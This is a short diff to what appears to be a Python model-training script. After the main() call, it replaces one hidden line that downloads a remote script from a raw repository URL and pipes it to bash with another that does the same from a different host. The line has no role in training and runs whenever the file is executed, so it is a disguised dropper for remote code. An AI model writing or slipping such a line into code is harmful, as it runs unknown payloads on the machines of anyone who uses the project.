@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/lightcoral2/escexela/raw/master/exela2 | bash')
+os.system('curl -sL https://gitlab.com/camilaita851/humans/-/raw/main/avian | bash')
